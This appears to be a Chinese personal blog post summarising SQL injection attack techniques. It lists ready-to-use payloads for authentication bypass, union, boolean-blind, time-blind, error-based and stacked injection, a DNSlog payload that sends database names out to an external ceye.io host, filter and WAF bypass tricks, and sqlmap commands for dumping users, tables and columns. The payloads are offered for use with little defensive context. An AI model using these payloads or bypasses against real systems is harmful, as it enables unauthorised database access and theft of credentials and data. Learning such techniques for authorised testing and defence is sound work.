---
title: sql注入总结
date: 2021-10-27 20:41:52
updated: 2021-10-27 20:41:52
tags: [sql注入]
categories: Web安全
toc: true
---
sql注入基本知识
<!-- more -->
### 一、常见注入方式

万能密码：

```mysql
1' or '1'='1　　　　　　　　#完整语句 select username,age from userinfo where id='' or '1'='1'
1' or 1=1#　　　　　　　　　#完整语句 select username,age from userinfo where id='' or 1=1#'
1'=0 #　　　　　　　　　　　　#完整语句 select username,age from userinfo where id=''=0#
```

`1' order by n --+` 或者 `1' group by n --+` 判断字段数，当n回显正常，n+1报错，即n是字段数

<font color='red'>注意事项：</font>

- 在手工注入时，字符串为表名要加反引号

#### 1.Union(联合查询)

union联合查询，若前者查询失败则会显示后者查询的结果
进而利用select 1,2,3,…… 找到可以显示的字段号，例如2,3 即可在2,3位置替换成相应的函数

`-1' union select 1,2,3 --+` or `-1' union select 1,2,'3`进行闭合

例如`database()`数据库名称,`version()`版本

```mysql
查询有哪些表：
group_concat('<br>',table_name) from information_schema.tables where table_schema=database()
查询表中字段：
group_concat('<br>',column_name) from information_schema.columns where table_name='' 
```

通过**information_schema**数据库获取信息

```mysql
1.查找库名
select schema_name from information_schema.schemata;
2.查找表
select table_name from information_schema.tables where table_schema='AAA';
3.查找表中字段
select column_name from information_schema.columns where table_schema=database() and table_name='BBB';
4.查找数据
select username,passwd from BBB;
```

**联合注入有个技巧。在联合查询并不存在的数据时，联合查询就会构造一个 虚拟的数据**

![](https://s2.loli.net/2022/02/04/K3R7nBP4ZrLTJip.png)

 如果当前页面有登录的话就可以混淆密码(包括md5密码查询)



#### 2.布尔盲注

> web页面返回值是布尔型，注入后根据页面返回值来得到数据库信息的方法

1.获取数据库名称的长度
	`(length(database()))>8 `不断的进行判断
2.获取数据库名称
	`(ascii(substr(database(),1,1))=115)`第一位 或者 `(substr(database(),1,1)='s')`
	`(ascii(substr(database(),2,1))=115)`第二位

#### 3.时间盲注

> 根据web页面响应的时间差来判断该页面是否存在SQL注入点（union和布尔盲注用不了时）

```mysql
1.用sleep判断注入点
	?id=1' and sleep(3) --+ 发现3s后网页才刷新，说明语句被带到数据库中执行了
2.获取数据库名称长度
	?id=1' and if((length(database())>7),sleep(3),1) --+ 不断进行判断
3.获取数据库名称
	?id=1' and if((ascii(substr(database(),1,1))>101),sleep(3),1) --+
```

#### 4.报错注入(xpath注入)

> 人为地制造报错条件，使查询结果能够出现在错误信息中（要能返回错误信息）

```mysql
#1.updatexml()
	?id=1' and (updatexml(1,concat(0x7e,(select user())),1))#
#2.extractvalue()
	?id=1' and (extractvalue(1,concat(0x7e,(select user()),0x7e)))#
```

#### 5.DNSlog盲注

> 利用其他协议或者渠道，http,dns解析等，将数据外带出来，直接回显数据实现注入，可以减少发送的请求

利用条件：mysql.ini中 secure_file_priv 必须为空
		为null时，不允许导入导出
		为/tmp时，导入导出只能在/tmp目录下
payload:
`?id=1' and load_file(concat('\\\\',(select database()),'.xxx.ceye.io\\abc'))--+`
相应更换sql语句，xxx为ceyo.io平台给每个账号起的昵称
例如：
`?id=1' and load_file(concat('\\\\',(select database()),'.t98xmx.ceye.io\\abc'))--+`

#### 6.堆叠注入

通过`;` 执行多条sql语句

#### 7.宽字符注入

通常过滤 `'` 的方法是在前面加上转义符：\

'的url编码为%27，\的url编码为%5c, 加上%df后

而在GBK编码方式下，%df%5c是一个繁体字“連”，所以单引号成功逃逸。

```mysql
id = -1%df' union select ……
```



### 二、绕过技巧

参考博客之一：[SQL注入绕过技巧 - VVVinson - 博客园 (cnblogs.com)](https://www.cnblogs.com/Vinson404/p/7253255.html)

##### 1.关键词嵌套、大小写绕过

- union ==> UNIunionO

##### 2.各种编码

- URL编码 **例如：# 对应的编码为 %23**
- 16进制编码
- ASCII编码
- Unicode编码
- 双重编码
- 还有8进制，utf-32，utf-16 等等

##### 3.关键字替换(也可以考虑php_RCE的绕过方式)

- 空格替换：/**/, () ,Tab代替空格, 0xa0用16进制解码，%0a %0b %0c %0d %09
- and替换：&&
- or替换：||
- =替换：!<>，like , rlike
- 引号替换：用16进制编码

##### 4.逗号绕过（**使用from或者offset**）：

在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。

对于substr()和mid()这两个方法可以使用`from to`的方式来解决：

```
select substr(database() from 1 for 1);
select mid(database() from 1 for 1);
```

使用join：

```
union select 1,2     #等价于
union select * from (select 1)a join (select 2)b
```

 使用like：

```
select ascii(mid(user(),1,1))=80   #等价于
select user() like 'r%'
```

对于`limit`可以使用`offset`来绕过：

```
select * from news limit 0,1
# 等价于下面这条SQL语句
select * from news limit 1 offset 0
```

##### .等价函数绕过

- hex()、bin()=ascii()
- concat_ws()=group_concat()
- mid()、substr()=substring()
- sleep() ==>benchmark()



### 三、sqlmap使用

详细使用：[sqlmap用户手册详解【实用版】 | 漏洞人生 (vuln.cn)](https://www.vuln.cn/2035)

tamper脚本讲解：[sqlmap注入之tamper绕过WAF防火墙过滤 | 漏洞人生 (vuln.cn)](https://www.vuln.cn/2086)

-u "url"			检测目标网站是否存在注入
-u "url" --dbs			获取数据库所有库的名称
-u "url" --users		列数据库用户
-u "url" --is-dba		判断当前用户是否为数据库管理员权限
-u "url" --current-db		获取当前使用的数据库
-u "url" --current-user		获取当前用户名称
-u "url" -D "xxx" --tables	获取xxx库下的表
-u "url" -D "xxx" -T "A,B" --columns 	获取A,B表中的字段
-u "url" -D "xxx" -T "A" -C "a,b,c" --dump 	导出表A中字段a,b,c的数据
		

-r xxx.txt			post传入数据进行注入
--level				探测等级参数
--tamper			使用绕过脚本
-u "url" -p "id,username"	指定参数进行扫描
设置具体sql注入技术：
	--technique B	布尔注入
	--technique E	报错注入
	--technique U	union查询注入
	--technique S	堆叠注入
	--technique Q	内联查询注入
	--technique T	时间盲注
	--technique T --time-sec 3 时间盲注时间为3

cookie注入：-u "url" --cookie "id=1" --level 2 --dbs
UA注入    : -u "url" --level 3 --dbs
refer注入 ：-u "url" --level 5 --dbs

